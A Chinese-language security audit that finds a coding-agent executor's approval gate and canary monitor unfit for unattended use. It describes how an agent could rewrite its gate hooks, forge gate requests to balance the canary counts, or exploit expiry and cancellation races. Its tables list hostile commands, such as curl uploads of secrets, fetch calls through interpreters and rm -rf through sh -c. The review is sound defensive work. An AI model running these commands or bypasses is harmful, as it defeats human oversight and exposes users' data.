# Codex 攒批 19 · SayDo Tier1 生产执行器批只读实证复核

日期：2026-07-26
立场：证伪优先；只读检查，不跑测试，不把 evidence 中的测试声称当成本轮复测结果。

## 0. 范围、提交边界与结论

用户给出的目标边界是 `SayDo` `main@602aa09`（基线 `2f657ed`，实现提交
`6e9014d`/`b837fdc`/`b9412aa`）。本报告以该不可变提交树为复核对象，所有
实现行号均按 `git show 602aa09:<path>` 重读。检查期间共享工作树随后前进到
`c87b734`（包含 `5391b0f`、`478864c`、`27e0951`、`97c74cc` 等 W2 提交），
并留下未跟踪的 `e2e/evidence/pull-forward-batch.md`；这些后续提交和工作树覆盖全部排除，不把它们的修复或
新增证据回填到本批裁决中。
`47118a9`/`65559c2` 也只作为历史上下文，不作为 `602aa09` 的安全承重依据。

只读提交锚点（本会话原始输出）：

```text
git -C SayDo rev-parse 2f657ed 602aa09 27e0951 c87b734
2f657ede6f75b5e87ae162fe82aacfdc1957d31d
602aa09b948f16a4737cfd73b8fc8485029f20ff
27e0951f37fda2d338c8e982b06317d3d6c61d07
c87b7343af44258516f363bc1ed9066354bde587
```

- 本轮没有修改 SayDo 代码、配置或测试，也没有运行测试。唯一写入的是本报告。
- evidence 的 live e2e 只证明一条正常路径：`RESULT.md:5-7` 描述
  `queued → agent → verify → settle → ready_for_review → approve → merge → task_done`；
  `events.jsonl:50-53` 是一次 `ls -la` shell 事件，`events.jsonl:82-83` 是
  agent 的 assistant/result 事件。它不能覆盖下文的并发、崩溃、恶意命令和
  vendor 事件变体。

总裁决：**`602aa09` 目标树不具备可接受的无人值守生产安全承重，判 No-Go。**

已证实成立的部分：gate socket 的异常/匹配失败默认 deny；gate.sh 的 JSON
构造确实走 `jq`；收据 accept 后单次 consume；verify 的 package script
`pre/main/post` 冻结闭包；agent/verify 环境的 key/token 白名单剥离和
setup `--ignore-scripts`；Tier1SettleProof 的字段与验收时的
`taskId/attempt/runId/treeSha` 交叉核对；回叫和派单的状态词在呈现层保持
“执行和检查都跑完了,等你验收”和“任务排进队列了,到验收点我叫你”。

仍然阻断上线的不是 happy-path，而是以下可达链：命令效果分类存在自动放行
S0/S1 的外发、删除和任意解释器路径；gate 脚本和 hook 没有真正的完整性
保护且 canary 是延迟的净计数；超时收据有过期后仍可 accept 的窗口；取消、
恢复和 settle 的写序非原子，且存在 stale approval、孤儿进程、晚到事件和
熔断重置；outbox 虽能入库但目标 daemon 没有生产轮询/发送链；若干状态转换
绕过统一状态机；默认 `step_confirm` 没有真正的计划步骤边界停靠。

## 1. Triage 总表

严重度约定：

- **A1**：可在正常生产路径触发越过 S3/门禁，造成外发、删除、提权或错误放行。
- **A2**：可造成取消/预算/证据/状态安全不变量失效，或崩溃后双跑。
- **B**：重要的契约、可用性或审计完整性缺口；通常需要并发、重启或特定输入。
- **P1**：canonical 已诚实登记的残面；不是隐藏绿灯，但不应在“全链成立”时被省略。

| ID | 红线/问题 | 裁决 | 严重度 | 可达性 | 关键证据 |
|---|---|---|---|---|---|
| T1 | 命令效果映射把 `find`、`env`、`git config/remote`、解释器和包脚本当作 S0/S1 | 证伪 | A1 | 生产可达 | `cmdEffect.ts:13-26,73-126`; `policy/engine.ts:37-47`; `gate.ts:55-56` |
| T2 | 管道/子 shell/进程替换/引号路径/force push 仍可降到 S2 或 S1 | 证伪 | A1 | 生产可达 | `cmdEffect.ts:48-52,76-90,101-126,139-160` |
| T3 | hook/gate 文件只“在 worktree 外”，没有不可写/哈希/身份保护；canary 只延迟净计数 | 证伪 | A1/A2 | 生产可达（同 UID） | `gateScript.ts:55-60`; `cmdEffect.ts:19-20,102-109`; `executor.ts:319-354,651-685`; `executor.ts:617-622` |
| T4 | canary 不能证明顺序：先绕门再走合法门可令两个计数相等；未知/解析失败事件被忽略 | 证伪 | A1/A2 | 生产可达/潜在 | `executor.ts:186-188,330-343,651-676`; `parsers.ts:17-25,52` |
| T5 | 版本 pin 仅 `includes` 且只断言一次；602 目标还没有绝对路径检查 | 部分成立 | B/A2 | 潜在；配置为相对或可变路径时生产可达 | `executor.ts:220-228`; `index.ts:617-623`; canonical `09-data-contracts.md:745` |
| T6 | 收据过期到本地 timer/sweep 之间仍可 accept+consume | 证伪 | A1 | 生产可达 | `approvalFlow.ts:97-113,131-147,175-210`; `issue.ts:86-103`; `executor.ts:270-272` |
| T7 | 取消后到下一 tick 前，gate 不复核 task/run；旧 receipt 或新 S0/S1 请求仍可放行 | 证伪 | A1 | 生产可达 | `executor.ts:232-295,319-365`; `operations.ts:104-120` |
| T8 | 取消请求/结算/恢复跨语句，崩溃可留下 task/run 不一致；cancel proof 未绑定 `runId` | 证伪 | A2 | 生产可达（崩溃/并发） | `operations.ts:112-145,151-168`; `executor.ts:924-985` |
| T9 | `cancel_requested` 分支不先杀 detached 孤儿；晚到事件判定函数未被调用 | 证伪 | A2 | 生产可达（daemon crash） | `executor.ts:88-93,924-938,651-676`; `operations.ts:185-202` |
| T10 | 活跃墙钟单字段覆盖并发审批；重启把 wall/turn/event 游标重置 | 证伪 | A2 | 生产可达/潜在 | `executor.ts:186-197,250,274-277,368-390,989-1012`; `ddl.ts:98-104` |
| T11 | settle 的 run→task→outbox 非原子；enqueue 失败被忽略；result 事件不是必需条件 | 部分成立 | A2 | 生产可达 | `executor.ts:769-805,714-755`; `callback/engine.ts:70-112` |
| T12 | 状态转换有多处裸 `UPDATE`，没有统一 `canTransitionTier1Run`/事务 | 证伪 | A2/B | 生产可达 | `operations.ts:118,138,275-323,375`; `dao/tasks.ts:74-114,170-207` |
| T13 | G3 三键闭包和 G4 剥离成立，但 config/TOCTOU/HOME 残面仍是 P1；Plan Delta 话术参数被丢弃 | 部分成立 | B/P1 | P1 已知；话术缺口生产可达 | `verifyFreeze.ts:49-56,85-107`; `executor.ts:739-743,872-891`; conformance `:36,42-46` |
| T14 | canonical/实现不一致：project schema 宽松、类型门缺失、`writing` DDL 缺失、`answerAgentQuestion` 未注册、版本 pin 回写过度声称 | 部分不一致 | B/P1 | 潜在/契约可达 | `projectConfig.ts:16-31`; `ddl.ts:5-11`; `brain/liveTools.ts:192-247,374-528`; canonical `09-data-contracts.md:707-720,798-809,745` |
| T15 | 零 emoji/状态词呈现层通过；raw agent 事件中的 `\u2705` 属用户明示豁免 | 成立（范围内） | — | — | `callback/arbitration.ts:64-73`; `dialog.ts:178-185`; `events.jsonl:82-83` |
| T16 | 默认 `step_confirm` 只落包/收据，执行器没有 `paused_step_boundary`/`step_paused` 步界停靠与继续确认 | 证伪 | A2/B | 生产可达（默认派单） | `brain/liveTools.ts:158-168,241-243`; `executor.ts:714-787`; canonical `04-key-mechanisms.md:168,179,182`; `09-data-contracts.md:314-316,580` |
| T17 | canonical 的项目级 `[git].protected` 未被执行器消费；自定义保护分支 push 可降为 S2 | 证伪 | A1/B | 条件生产可达（项目配置含额外保护分支） | `projectConfig.ts:16-31,58-81`; `executor.ts:146-158,250-258`; `index.ts:640-654`; `policy/engine.ts:72-82`; canonical `09-data-contracts.md:121-127,706-715` |
| T18 | `observedModel` 族解析为 `null` 时不作废；严格档要求缺失/不可解析/不符均拒结算 | 证伪 | A2/B | 生产可达（事件/vendor 返回未知模型名） | `executor.ts:718-727`; `family.ts:40-61`; `index.ts:644-650`; canonical `09-data-contracts.md:750,771` |
| T19 | justfile verify 只冻结目标 recipe，不冻结 prerequisites/imports/变量闭包 | 证伪 | A1/A2 | 生产可达（登记 just task 有依赖时） | `verifyFreeze.ts:28-46,58-77`; `executor.ts:736-755` |
| T20 | `.saydo/project.toml` 的 setup 由仓库输入自动执行，未绑定 owner/package digest/S2 收据 | 证伪 | A1/B | 条件生产可达（仓库声明 setup） | `projectConfig.ts:43-81`; `executor.ts:545-573`; canonical `09-data-contracts.md:706-721` |
| T21 | setup/verify 用同步 `execFileSync` 阻塞 daemon，期间 cancel/三熔断/tick 均停摆 | 证伪 | A2 | 生产可达（慢/挂起安装或验证） | `executor.ts:567-573,748-820`; `index.ts:656-660` |
| T22 | spawn 后才注册 `onLine`，无缓冲契约；极快 agent 的早期事件可能丢失 | 潜在 | A2/B | 潜在（极快退出/实现差异） | `executor.ts:44-62,594-605`; `executor.ts:94-129` |
| T23 | claim 的 SELECT 与 reserved INSERT 无 running CAS；跨进程/取消竞态可在 cancel_requested 后新起 run | 证伪 | A1/A2 | 潜在；多 daemon/外部 writer 时生产可达 | `executor.ts:411-424,457-476`; `operations.ts:104-120` |
| T24 | receipt 状态推进 read→transition→UPDATE 无 expected-state CAS | 证伪 | B/A2 | 潜在（多进程/并发 sweep 与裁决） | `approvals/issue.ts:86-103`; `contracts/statemachines/receipt.ts:35-67` |
| T25 | `settleCancelledRun` 吃掉 settle 异常后删除内存 active，无重试/补偿 | 证伪 | A2 | 生产可达（SQLite/进程间暂时失败） | `executor.ts:894-910`; `operations.ts:128-145` |
| T26 | 启动版本断言失败在 `recover/killOrphanAgent` 之前，旧 detached agent 可遗留 | 证伪 | A2/B | 条件生产可达（重启同时版本漂移） | `index.ts:657-666`; `executor.ts:915-938,1105-1123` |
| T27 | outbox 只有 enqueue；生产 daemon 未轮询 `attemptNotify`/arbitrate，ready/blocked 不会实际回叫 | 证伪 | A2/功能 P0 | 生产可达（正常 settle 即触发） | `executor.ts:788-801,872-891`; `callback/engine.ts:70-135`; `index.ts:583-612` |
| T28 | 恢复信任同 UID 可写且无 schema/digest 的 `frozen-verify.json`；缺失时还会按当前仓重冻 | 证伪 | A1/A2 | 生产可达（agent/文件损坏后重启） | `executor.ts:1001,1047-1054,1080-1085`; evidence `RESULT.md:41-42` |
| T29 | 验收 `reject` 只落 `cancel_requested`，ready_for_review 无 active run 时不自动 `cancel_settled` | 证伪 | A2 | 生产可达（验收 reject） | `operations.ts:315-330`; `operations.ts:171-183`; canonical `09-data-contracts.md:327,586` |
| T30 | Tier1CancelProof 的 `lastEventId` 是合成 line cursor，不是 vendor event id；晚到判定即使接上也失配 | 证伪 | B/A2 | 生产可达（取消/晚到事件） | `executor.ts:651-676,894-903`; `operations.ts:185-202`; canonical `09-data-contracts.md:572-586` |
| T31 | `step_paused`/`paused_step_boundary` 恢复分支按不一致或 running 处理，可能丢停靠/重起 | 证伪 | A2 | 生产可达（daemon restart during step pause） | `executor.ts:940-985,989-1025`; canonical `09-data-contracts.md:314-316,580` |
| T32 | 版本探测 `--version` 继承 daemon 全量 env，未用 strippedAgentEnv | 部分成立 | B/A2 | 条件生产可达（恶意/被替换二进制） | `executor.ts:77-81`; `index.ts:657-659`; `executor.ts:65-75` |
| T33 | worktree/git snapshot/safeGit 也继承全量 env，git helper/filter 可触及凭据 | 潜在 | B/A2 | 条件生产可达（恶意 repo 配置/属性） | `executor.ts:610-615,759-763,1088-1093`; G4 `executor.ts:65-75` |
| T34 | blocked occurrenceKey 只取 exitEvidence 前 80 字符，不含 attempt，可能被活跃 dedupe 吃掉后续回叫 | 部分成立 | B/P1 | 潜在；并发/旧条目未冻结时生产可达 | `executor.ts:872-891`; `callback/engine.ts:82-87`; canonical `09-data-contracts.md:383-397` |
| T35 | gate 将命中冻结 argv 的 verify 直接标 S1，运行中改脚本后仍可先执行，漂移只在 settle 才发现 | 证伪 | A1 | 生产可达（agent 改 verify 后主动运行） | `executor.ts:245-248,736-755`; `verifyFreeze.ts:85-107` |
| T36 | `verifyAndCompleteMerge` 不 parse `MergeProof`，只依赖 TS 类型/字段比较 | 部分成立 | B/P1 | 潜在（其他写口/JS 调用） | `operations.ts:355-379`; `api/actions.ts:105-110` |
| T37 | `parseCursorLine(null)` 抛 TypeError，事件消费未捕获，malformed vendor 行可打崩 daemon | 证伪 | A2 | 生产可达（agent 输出合法 JSON `null`） | `parsers.ts:21-27`; `executor.ts:651-676` |
| T38 | outbox transition 先读状态再按 `id` 裸写，无 `state=from` CAS；并发 notify/ack/freeze 可互相覆盖 | 证伪 | B/A2 | 潜在（多写者/接上线后生产可达） | `storage/dao/outbox.ts:56-86`; `callback/engine.ts:116-163` |
| T39 | Brain `getStatus` 把 `attempt=1`、`elapsedActiveMs=0`、事件摘要硬编码，返工后视图与真实状态脱节 | 证伪 | B/P1 | 生产可达（状态查询/验收前端） | `brain/tools.ts:98-120`; canonical `09-data-contracts.md:835` |
| T40 | agent 看到 result 即 resolve/wait，未等待进程组/子进程退出；取消 proof 直接宣称锁已释放 | 证伪 | A2/B | 生产可达（result/取消后有 detached 子进程） | `executor.ts:101-139,894-910`; `executor.ts:605-607` |
| T41 | shutdown 只 kill 内存 proc，不设 abort/cancel、不关闭 Unix gate；3 秒退出可能留下可继续过门的旧 agent | 证伪 | A2/B | 条件生产可达（SIGTERM/SIGINT 窗口） | `executor.ts:1126-1135`; `index.ts:656-677` |
| T42 | `eventLine++` 先于 append，写盘异常被吞；proof 仍引用不存在/漂移的 transcript cursor | 证伪 | B/A2 | 条件生产可达（磁盘/权限/I/O 故障） | `executor.ts:651-657,769-779` |
| T43 | config 可指定非 cursor adapter，但入口始终起 `cursor-agent`，记录的 adapter 与实际 provider 不绑定 | 证伪 | B/A2 | 条件生产可达（错误/异常 config） | `index.ts:414-420,639-654`; `executor.ts:594-605` |
| T44 | Tier1 执行器没有记录自己的 LLM/API usage；成本熔断只 SUM 既有 `source='api'` 行，实际 cursor 调用可为零账 | 证伪 | B/A2 | 生产可达（API 计费或成本上限依赖记账） | `executor.ts:382-390`; `cost/ledger.ts:15-66`; `executor.ts:594-605` |
| T45 | 复用 worktree 只看目标存在 `.git`，不校验 repo/branch/HEAD；上一轮可污染 pointer，下一 attempt 直接在错误仓执行 | 证伪 | A1/A2 | 生产可达（同 task 返工/重试后） | `executor.ts:610-623`; `operations.ts:289-313,394-453` |
| T46 | PID 文件写入失败/半写被吞，recover 按裸 PID kill；无身份校验且多 active rows 可同时恢复双跑 | 证伪 | A2/B | 条件生产可达（I/O、PID reuse、崩溃竞态） | `executor.ts:915-1026,1096-1123` |
| T47 | `just`/package verify 名称未做 shell/argv 语义约束，冻结 argv 字符串优先于效果解析，恶意登记名可把复合命令标成 S1 | 部分成立 | A1/P1 | 潜在；仓库/配置可控时生产可达 | `verifyFreeze.ts:35-46,70-77`; `executor.ts:245-248`; `cmdEffect.ts:160-164` |
| T48 | gate.sh 将 socket/log 路径直接嵌入单引号 shell 变量，特殊 `SAYDO_HOME` 路径可破坏脚本语法 | 潜在 | B | 潜在（非常规环境路径） | `gateScript.ts:13-26`; `index.ts:57-63` |

## 2. 红线 1：fail-closed 四律

### 2.1 只依赖 deny：基础异常路径成立，取消竞态不成立

基础链条的确是 fail-closed：

- `decideCommand` 对风险计算异常返回 S3 deny，S0/S1 才 allow，S2 只接受
  `stepConfirm` 的明确 true，异常和超时均 false（`gate.ts:43-70`）。
- `handleGateRequest` 找不到 worktree 或已有 `run.abort` 时 deny
  （`executor.ts:232-245`）。
- gate socket 的路由、JSON、handler 异常都返回结构化 deny
  （`gateServer.ts:28-65`）。
- gate.sh 只有 jq 读到精确字符串 `allow` 才输出 allow，其余包括 curl/jq
  失败均输出 deny（`gateScript.ts:19-34`）。

但这不等于所有异常路径都 fail-closed。`handleGateRequest` 只在 await 前检查
一次 `run.abort`（`executor.ts:232-245`），随后等待 `decideCommand`
（`executor.ts:250-273`），finally 只记等待时间（`executor.ts:274-279`）。
取消、预算熔断或 canary 在等待期间发生时，没有再次读取 task/run 状态，也没有
把已签发 receipt 置为 void。只要用户在下一次 15 秒 tick 前 accept，旧 promise
仍可能返回 allow。该构造在 T7 详述，属于生产可达 A1。

### 2.2 JSON 用 jq：成立，但日志不是脱敏日志

gate.sh 的请求、响应和日志行均用 `jq -nc` 构造，畸形响应落到 deny
（`gateScript.ts:23-34`）；daemon 侧用 zod/JSON.parse 后只输出结构化对象
（`gateServer.ts:11-15,51-64`）。这条红线成立。

不过同一日志把完整命令原文写入 `gate-fired.log`，没有 digest 或 redaction
（`gateScript.ts:23`）。若命令参数含 token、URL credential 或客户数据，
凭据剥离并不能阻止 agent 自己生成/读取后把它放进命令行；日志会持久化该
明文。此为 G4 的 B/P1 保密残面，不应把“审计 digest”与“gate 日志”混称。

### 2.3 超时=deny：存在可实际利用的过期窗口

实现的三个时间点不是同一个截止点：

1. receipt 的 `expiresAt` 是签发后 `timeoutSec`（`approvalFlow.ts:95-113`）；
2. RuntimeApprovalFlow 本地 deny timer 是 `timeoutSec + 2s`
   （`approvalFlow.ts:131-147`）；
3. executor 的 `Promise.race` 上限是 `receiptTimeout + 5s`
   （`executor.ts:270-272`），scheduler 另按 15 秒 sweep 处理过期收据。

更关键的是 `applyReceiptEvent` 只依据 outcome/decision 状态机，不比较当前时间
或 `expiresAt`（`approvals/issue.ts:86-103`；`contracts/statemachines/receipt.ts:35-67`）。
因此在 `expiresAt` 已过、但本地 `+2s` timer 尚未触发时，console
`POST /api/approvals/:id/decide` 或语音 flow 都可以执行
`user_accept → consume`，gate promise 会被 resolve(true)，命令获准。这个
是一个约 2 秒的真实 allow 窗口，不是理论上的 timer 抖动，故 T6 为 A1/生产可达。

curl `--max-time 110` 与 executor 供给的 hook `timeout=120`
（`gateScript.ts:10-11,24-26`；`executor.ts:617-622`）本身没有反向 fail-open，
但它们不能修复 receipt expiry
窗口。

### 2.4 每命令独立审批：核心 consume 成立，不能覆盖 stale/cross-run

每个 gate 请求先递增 `seq`（`executor.ts:245`）；RuntimeApprovalFlow 为每条
命令创建 receipt，accept 立即执行 consume，重复裁决在终态被拒
（`approvalFlow.ts:84-124,175-210`）。没有发现“一张已 consume receipt 直接
搭第二条命令”的正常路径；这部分成立。

边界是 receipt 只由 ID 绑定，`decide` 不核对 task/run/seq 当前是否仍活跃，
也不核对 `ctx` 与 receipt 的 session/turn（`approvalFlow.ts:175-210`）。
因此“单次消费”并不等于“仍属于当前命令”；T6/T7 的 stale receipt 仍可产生
错误审计或旧命令放行。

## 3. 红线 2：门完整性、canary 与版本 pin

### 3.1 已知 A4 的简单反例确实被 evidence 证伪

执行器在收到 gate 请求时先 `gateSeq++`，shell `tool_call started` 识别后
`shellStarted++`（`executor.ts:245,667-671`）。因此一个被 deny 的 shell
仍会产生 started 事件，不能用“只数 allow”来反驳计数基准。验收文件明确写
出该事实（`e2e/evidence/executor-batch.md:36-37`），RESULT 也把真实 agent
deny 与 allow 分开记录（`e2e/poc/tier1-live-executor/RESULT.md:47-51`）。
本条不重复旧 A4 结论。

### 3.2 但目标树 canary 不是“立即 cancel”，且净计数可被抵消

实现每 15 秒 tick 检查一次，第一次差值只置 `canarySuspect`，第二次才 kill
（`executor.ts:319-354`）；只有进程退出后的 settle 点才做一次
`shellStarted > gateSeq` 硬检（`executor.ts:689-708`）。这与 canonical
“出现无 hook 回调即立即 cancel”的不变量（`voice-coding/docs/04-key-mechanisms.md:186-190`）
不同：一条危险命令可以在 15–30 秒内完成，事后把任务标成 failed 不能撤销已发生的
删除、外发或提权。

更强的新构造不依赖 deny 计数错误：

1. 代理先通过被删/篡改的 hook 执行一个可识别的 shell，得到
   `shellStarted=1, gateSeq=0`；
2. 在下一 tick 前再执行一条正常经过 hook 的 shell，得到
   `shellStarted=2, gateSeq=1`；
3. 随后利用同 UID 可达的 gate socket 发送一条**没有对应 tool_call 的伪造
   gate 请求**，计数变成 `shellStarted=2, gateSeq=2`。

实现只看净差值，不看序列或每次请求与事件的配对
（`executor.ts:186-188,330-343`），两 tick 和 settle 硬检都可能通过；只要
攻击者能制造无对应的请求或事件，“先绕门、后走门”的交错就能抵消差值。这一构造没有被
`events.jsonl` 的单次 happy-path 覆盖，故 T4 为 A1/A2。

还有更直接的“洗计数”路径：gate wire schema 只有 `command`、`cwd` 两个字段
（`gateServer.ts:11-15`），没有 hook nonce、进程身份或不可伪造的命令序号；
`handleGateRequest` 收到任何匹配 worktree 的 POST 都会自增 `gateSeq`
（`executor.ts:232-248`）。同 UID agent 在改掉 hooks 后，可以先执行绕门命令，
再直接调用 gate socket/gate.sh 发送若干伪造 command，把净计数补齐；daemon
没有能力证明这些请求对应实际 shell。故这里不是只依赖“事件先后不确定”的
理论争议，而是可构造的相关错误链。

### 3.3 未知/解析失败事件实际上被忽略，直接扩大绕门面

cursor parser 对空行、JSON 解析失败和未知顶层事件返回 `unknown`/
`parse_error`（`providers/byoa/parsers.ts:17-25,49-52`）。但 executor 对这两类
没有 abort、没有 failed；`consumeEventLine` 只处理 model/result/tool_call，
最后明确注释“unknown/parse_error … 不作废”然后返回
（`executor.ts:651-676`）。

于是 vendor 新事件格式、恶意伪造的 shell 事件形状或损坏行可以不增加
`shellStarted`/`toolCalls`，而 agent 仍可能实际执行命令。canary 的“独立于
vendor 语义”承诺因此不成立。至少应把未知/解析失败变成不可结算的安全终局，
而不是只靠净计数。

### 3.4 gate 脚本和 hook 没有达到“agent 不可写”

`ensureGateScript` 只 `mkdirSync`、`writeFileSync`、`chmod 0755`
（`gateScript.ts:55-60`）。没有校验目录 owner/mode、拒绝 symlink、保存
不可变 digest，亦没有每次 hook 执行前校验。`~/.saydo/tier1/gate.sh` 在
同一用户的普通文件权限语义下仍由 agent 进程可写；“不在 worktree 外”
不是 OS 不可写。

worktree 内的 `.cursor/hooks.json` 更是直接由执行器写入、且位于 agent 可写
目录（`executor.ts:610-623`）。代码只在供给/恢复时重写，没有运行中监视。
目标树 `cmdEffect` 允许 `node`、`cp`、`mv`、`ln`、`chmod` 等 S1
（`cmdEffect.ts:19-20,102-109`；`47118a9` 新增的 sudo/破坏词头并未改变这些
解释器/文件操作路径）。因此同 UID agent 可先改 gate/hooks，再执行任意
外部命令；延迟 canary 只能在副作用发生后标记任务失败。T3 是生产可达 A1。

这条链甚至不需要再找一个 S1 shell：live 证据明确记载 Cursor 内置
`write` 工具“不经过 `beforeShellExecution`”，可直接改 worktree 文件
（`e2e/poc/tier1-live-executor/RESULT.md:41-42`）；canonical §11 也把
“内置 write 可写任意用户可写路径”列为同 UID 残面。该工具既不产生
`shellStarted`，也不产生 `gateSeq`，所以两 tick/settle 的 shell 净计数可能
完全不动，连“事后标失败”都未必发生。因而 `.cursor/hooks.json`、
`~/.saydo/tier1/gate.sh` 及其它同 UID 可写路径都不能只靠 shell canary 保护。

还有两个容易被“落在 worktree 外”掩盖的路径问题。第一，`ensureGateScript`
没有拒绝现存的 symlink；同 UID 的 `ln -sf`/`mv`（在当前 S1 词表内）可以把
`gate.sh` 替换成指向可写目标，下一次 hook 会跟随该链接执行。第二，
`buildGateScript` 把 `sockPath`/`logPath` 原样放进单引号 shell 赋值
（`gateScript.ts:13-26`）；非常规 `SAYDO_HOME` 含单引号或换行时，生成脚本
可能语法失效，甚至改变脚本语义。这是条件 B（不是普通 macOS home 的默认
攻击路径），但说明“重写一次”不等于供给完整性。

### 3.5 版本 pin 是“字符串 + 一次”，不是锁定副本证明

用户指定的 `602aa09` 版本没有 `cursor_agent_bin` 的 `isAbsolute` 守卫
（`index.ts:617-623`）；后续分支中的补强不计入本批。

在目标树中，`assertVersion` 只检查
`actual.includes(pinnedVersion)`，然后把 `versionAsserted` 永久置 true
（`executor.ts:211,220-228`）。没有要求路径落在
`versions/<pinned>/cursor-agent`、没有 `realpath`/inode/hash、没有每次 spawn
重断言；`includes` 也允许短字符串匹配伪造版本输出。canonical 明确要求
绝对的 `versions/<ver>/cursor-agent` 锁定副本、启动断言和禁自更新
（`voice-coding/docs/09-data-contracts.md:745`）。若同 UID 更新 symlink/副本，
首认领后的后续 run 可使用漂移二进制。故 T5 只能部分成立，至少是 B/P1，
在可写版本目录的主机上可升级为 A2。

## 4. 红线 3：cmdEffect 保守映射

### 4.1 自动放行的具体反例

`computeRisk` 对 `read`/`write_worktree` 是 S0/S1 自动放行，对
`delete_data`/`send_external` 才是 S3（`policy/engine.ts:37-47`；
`gate.ts:55-56`）。而 `classifySegment` 只看第一个词，以下命令在目标树
实现中的效果至少会低于 canonical 要求：

| 构造 | 词面结果 | 应有的保守结论 |
|---|---|---|
| `find . -delete` | `find` 在 `READ_ONLY_HEADS`，S0 | 即使只删 worktree 内文件也不是只读，至少 S1；若目标越界则 S3 |
| `find /tmp -delete` | 仍以 `find` 判 `read`，S0 | 越界删除，S3/拒绝 |
| `find . -exec curl https://x \;` | 仍以 `find` 判 `read` | 对外发送，S3 |
| `cat <(curl https://x)`、`echo <(ssh host ...)` | 进程替换未拆，按 `cat`/`echo` 判 S0/S1 | 内层外发/远程执行，S3 |
| `env curl https://x` | `env` 判 `read` | `env` 可执行后续命令，至少 S2，外发时 S3 |
| `git config --global ...`、`git remote set-url ...`、`git branch -D main`、`git remote remove origin` | `config`/`remote`/`branch` 被列为 git read | 改变全局 git/远端或删除分支，不能 S0 |
| `git diff --output=/tmp/x`、`git worktree add /tmp/x` | `diff` 判 S0，`worktree` 判 S1；重定向/目标路径未展开 | worktree 外写入，至少 S2，系统路径按 S3 |
| `node -e "fetch('https://x')"` | `node` 是 S1 | 外发，S3 |
| `awk 'BEGIN{system("curl https://x")}'` | `awk` 是 S1 | 外发，S3 |
| `mkdir /tmp/x`、`touch /etc/x`、`sed -i ... /tmp/x` | 文件类词头统一 S1，不看目标路径 | worktree 外写入，至少 S2；系统路径应 S3 |
| `curl -T secret.txt https://x`、`wget --post-file=secret https://x` | `hasWriteMethod` 未命中，S2 | 上传/外发，S3（且应走屏幕强认证） |
| `pnpm dlx evil`、`pnpm exec curl ...`、`npx evil` | 包管理器非 install 统一 S1 | 下载并执行外部包/命令，至少 S2，外发时 S3 |
| `npm run evil`、`just evil` | 包管理器/just 非 install 统一 S1 | 任意仓库脚本，可外发/删除，至少 S2/S3 |
| 项目 `[git].protected=["release"]` 时 `git push origin release` | `projectConfig` 不读 `[git]`，executor 也未注入项目保护集；仅默认 `main/master` 生效，结果 S2 | 自定义保护分支应 S3/拒绝 |

对应代码就在 `cmdEffect.ts:13-26,73-99,119-126`；没有 quote-aware parser，
也没有对 `find -exec`、`xargs`、`env`、`eval`、`exec`、`sh -c` 等 wrapper
做效果展开。未知词头本身确实上浮到 `install_dependency`（`cmdEffect.ts:126`），
但“已知 wrapper 被错误识别为低危”绕过了这条防线。由于 S0/S1 直接 allow，
T1 是生产可达 A1，而不是只影响提示文案。

同样，canonical 要求保护集为
`["main","master"] ∪ project.toml [git].protected`（`09-data-contracts.md:121-127`）。
目标树 `projectTomlSchema` 没有 `git` 域，`readProjectExecConfig` 只返回
verify/setup；executor 创建时 `protectedBranches` 也未从项目配置注入
（`projectConfig.ts:16-31,58-81`; `executor.ts:146-158,250-258`）。
因此额外保护分支会被静默降级为普通 `push_branch`/S2，T17 是条件生产可达的
A1。

### 4.2 管道、子 shell、越界路径和 push 仍有降级面

`commandToEffect` 已修复单管道拆段和显式 `| sh`（`cmdEffect.ts:139-161`），
这解释了 evidence 中 A2 “已修”的结论；但修复不是完整 shell 语义：

- `echo $(curl https://x)` 命中 `hasSubshell` 后只把外层 `echo` 的 S1
  提到 S2，不会把内层 curl 变成 `send_external`（`cmdEffect.ts:149-159`）。
- `sh -c 'rm -rf /'`、`bash -c ...`、`curl ... | python` 不是
  `pipe-to-shell` 正则覆盖的形态，最高可能只是 S2。
- 越界检测只识别紧跟 `/` 或 `~/` 的重定向/tee
  （`cmdEffect.ts:48-52`）；引号、`$HOME`、变量和 `--output=/tmp/x`
  不能升到 delete/send S3（curl 这一路仍只是 S2），而
  `cp/mv/ln/chmod "$HOME/..."` 更可直接落到 S1。
- force push 只识别精确的 `--force`、`-f`、`--force-with-lease`
  （`cmdEffect.ts:73-84`）。`+feature:feature`、`--force=...`、
  `--mirror`、某些 `--delete` 形态仍可能是 S2；`HEAD:refs/heads/main`
  的目标字符串也不会等于 protected 列表中的 `main`。

这些命令即使最终需要用户 accept，也违反“效果决定风险”和 S3 不经语音
放行的相关错误链；其中 S1 例直接越过确认，故 T2 为 A1。

## 5. 红线 4：G3 verify 与 Plan Delta

### 5.1 三键闭包和 Plan Delta 核心成立

package script 冻结为 `pre/main/post` 三键 JSON，缺失键也纳入 digest
（`verifyFreeze.ts:49-67`）；执行前重新读取同一闭包并比较 digest，不符返回
`content_drift`（`verifyFreeze.ts:85-107`）。executor 在 content drift 时
走 `blocked` 和 `planDeltaCallback`（`executor.ts:731-746`），不是继续执行
漂移脚本。该项与 `tier1-conformance.md:28-36` 的实证描述一致。

### 5.2 “回叫重拍板”的原因没有进入 durable callback

`finalizeFailure` 接收 `spokenReason`，但传给 `enqueueBlocked` 后参数被命名为
`_spokenReason` 且完全未使用（`executor.ts:824-891`）。outbox 只保存
`exitEvidence`/`transcriptCursor`（`callback/engine.ts:70-112`），没有
`planDeltaCallback.reason`。因此状态会是 blocked，审计也有
`plan_delta:<templateRef>`，但用户要求的“要改验证命令,需要你重新拍板”不保证
能在回叫层呈现。安全状态成立，用户/契约话术不成立，严重度 B/P1。

### 5.3 已登记的 P1 残面是诚实的，但仍是上线边界

实现注释明确承认框架 config（如 `vitest.config.ts`）在冻结面外
（`verifyFreeze.ts:54-56`），并承认 precheck 读盘和 pnpm/just 执行之间存在
TOCTOU（`verifyFreeze.ts:85-90`）。conformance 也登记了 config 与 HOME
残面（`e2e/evidence/tier1-conformance.md:36,42-46`）。这部分不是隐瞒，
但它意味着“生成方不能自评”的完整强保证尚未达到；应保持 P1，不得在总评中写成
全链无缺口。

另有两个未登记的小面：

- `extractJustTask` 把项目提供的 `name` 直接插入 RegExp，未转义
  （`verifyFreeze.ts:35-46`），`.*` 等 ref 可匹配错误 recipe，异常 ref
  也可能使冻结失败。应至少把 ref 正规化/转义。
- `reviewTask` 交叉核对 proof 时检查 task/attempt/run/tree，却没有核对
  `packageRevision`（`operations.ts:247-270`）；在 revision 变更/脏库场景下
  证据绑定不完整，属 B/P1。

### 5.4 justfile 的 verify 闭包没有覆盖 prerequisites

